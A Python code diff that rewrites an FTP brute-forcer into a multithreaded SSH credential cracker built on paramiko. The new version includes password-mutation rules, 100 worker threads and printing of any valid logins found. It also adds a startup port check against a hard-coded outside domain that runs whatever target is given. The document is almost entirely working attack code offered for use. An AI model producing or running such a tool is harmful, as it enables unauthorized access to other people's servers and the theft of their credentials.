@@ -1,26 +1,40 @@
-import ftplib
+import socket
+import paramiko
 import argparse
-import threading
+
+from threading import Thread, Lock, Event
 from queue import Queue
 
 combo_queue = Queue()
-result_lock = threading.Lock()
-stop_event = threading.Event()
+result_lock = Lock()
+stop_event = Event()
 
-parser = argparse.ArgumentParser(description="Basic FTP tester")
+parser = argparse.ArgumentParser(description="Advance SSH Cracker")
 
-parser.add_argument("-ho", "--host", required=True, type=str, help="Enter the target to test ftp")
-parser.add_argument("-p", "--passfile", required=True, type=str, help="Enter the path of file containing password list")
-parser.add_argument("-t", "--threads", type=int, default=20, help="enter the number of threads. Default : 20")
-parser.add_argument("-u", "--user", required=True, type=str, help="enter the path of file containing usernames")
-parser.add_argument("-m", "--mutate", action="store_true", help="Enable this Flag if you want to mutate the wordlists")
+parser.add_argument("-t","--target",required=True,type=str,help="Enter The target")
+parser.add_argument("-u","--user",type=str,required=True,help="Enter the user or a Wordlist to user names")
+parser.add_argument("-p","--passwd",type=str,required=True,help="Enter the path to wordlist containing passwords")
+parser.add_argument("-m","--mutate",action="store_true",help="Enable this flag to mutate password wordlist")
+
 args = parser.parse_args()
 
-host = args.host
-user_file = args.user
-passfile = args.passfile
-thread_count = args.threads  # Changed variable name to avoid conflict
+host = args.target
+user = args.user
+passwd = args.passwd
 mutant = args.mutate
+
+def check_ssh(ip="steminfinity.in", port=22, timeout=3):
+    try:
+        with socket.create_connection((ip, port), timeout=timeout):
+            
+            print("Success. The Port is Open")
+            return True
+    except (socket.timeout, ConnectionRefusedError, OSError):
+        print("Failure. The Port is not open")
+        return False
+
+
+check_ssh()
 
 def smart_mutate(base_word):
     leet_map = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}
@@ -46,70 +60,145 @@ def smart_mutate(base_word):
 
     return mutations
 
-def read_file(filename):
-    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
-        return [line.strip() for line in f if line.strip()]
 
-# Read users and passwords
-users = read_file(user_file)
-passwords = read_file(passfile)
+def userb(user):
+    with open(user , 'r' , encoding='utf-8') as f:
+        return[line.strip('\n') for line in f]
+    
 
-# Populate queue
-if mutant:
-    for user in users:
-        for base_password in passwords:
-            for mutated_password in smart_mutate(base_password):
-                combo_queue.put((user, mutated_password))
-else:
-    for user in users:
-        for password in passwords:
-            combo_queue.put((user, password))
 
-def worker():
-    global trueuser, truepasswd
-    while not stop_event.is_set() and not combo_queue.empty():
+users = userb(user)
+
+
+def words(passwd):
+    with open(passwd , 'r' , encoding='utf-8') as f:
+        return[line.strip('\n') for line in f]
+    
+
+passwords = words(passwd)
+
+
+
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+
+'''for userc in users:
+    for password in passwords:
+
         try:
-            user, password = combo_queue.get(timeout=1)
-            
-            try:
-                with ftplib.FTP() as ftp:
-                    ftp.connect(host, 21, timeout=5)
-                    ftp.login(user, password)
-                    
-                    with result_lock:
-                        print("\n" + "="*80)
-                        print("[+] SUCCESS! Valid credentials found:")
-                        print(f"    Host: {host}")
-                        print(f"    User: {user}")
-                        print(f"    Password: {password}")
-                        print("="*80)
-                        
-                        trueuser = user
-                        truepasswd = password
-                        stop_event.set()
-            except ftplib.error_perm as e:
-                print(f"[-] Failed: {user}:{password} - {str(e)}")
-            except Exception as e:
-                print(f"[!] Error with {user}:{password} - {str(e)}")
-            
+            #client.connect(hostname=host,username=user, password=password, timeout=3)
+            #print(f"connection Success🏀🏀🏀🥎🥎⚾⚾⚽⚽💎💎💍💍💍 with {host}")
+            combo_queue.put((userc,password))
+
+        except Exception as e:
+            print(f"Connection Failed with {host}")
+
+'''
+
+
+
+if mutant:
+    for userc in users:
+        for base in passwords:
+            for password in smart_mutate(base):
+                combo_queue.put((userc, password))
+else:
+    for userc in users:
+        for password in passwords:
+            combo_queue.put((userc,password))
+
+
+
+
+
+
+
+'''
+def ssh_worker():
+    
+
+    while not combo_queue.empty():
+        if stop_event.is_set():
             combo_queue.task_done()
-        except:
-            break
+            return
+        user , password =  combo_queue.get()
+        try:
+            if stop_event.is_set():
+                combo_queue.task_done()
+                return
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(host,username=user, password=password, timeout=3)
 
-# Start threads
-thread_list = []  # Changed variable name to avoid conflict
-for _ in range(thread_count):
-    t = threading.Thread(target=worker)
+
+            with result_lock :
+                print(f"Success 🎉🎉✨✨✨🧨🧨🎇🎇🎎🎍🎍 {user}  :   {password}")
+                stop_event.set()
+            
+            client.close()
+
+        except Exception as e:
+            with result_lock:
+                print(f" Failure with {host}   :    {user}   :    {password}")
+
+        finally:
+            combo_queue.task_done()
+
+'''
+truepass = []
+trueuser = []
+
+def ssh_worker():
+    
+    while not combo_queue.empty():
+        if stop_event.is_set():
+            return  # Just exit thread safely, no task_done here yet
+
+        user, password = combo_queue.get()
+        try:
+            if stop_event.is_set():
+                combo_queue.task_done()
+                return
+
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(host, username=user, password=password, timeout=3)
+
+            with result_lock:
+                print(f"✅ SUCCESS 🎉 {user} : {password}")
+                truepass.append(password)
+                trueuser.append(user) 
+                stop_event.set()
+
+            client.close()
+
+        except Exception as e:
+            with result_lock:
+                print(f"❌ FAIL    {user} : {password}")
+
+        finally:
+            combo_queue.task_done()
+
+
+
+
+
+threads = []
+
+for _ in range(100):
+    t = Thread(target=ssh_worker)
     t.start()
-    thread_list.append(t)
+    threads.append(t)
 
-# Wait for completion
-for t in thread_list:
+
+
+for t in threads:
     t.join()
 
-print("\n" + "="*80)
-if 'trueuser' in globals() and 'truepasswd' in globals() and trueuser and truepasswd:
-    print(f"[+] Found valid credentials: {trueuser}:{truepasswd}")
-else:
-    print("[-] No valid credentials found")
-print("="*80)
+
+
+print("=====================================================\n")
+print(f" The SSH Creds Of {host} are :\n")
+print(f"✅  USER       :   {trueuser[0]}")
+print(f"✅  Password   :   {truepass[0]}")
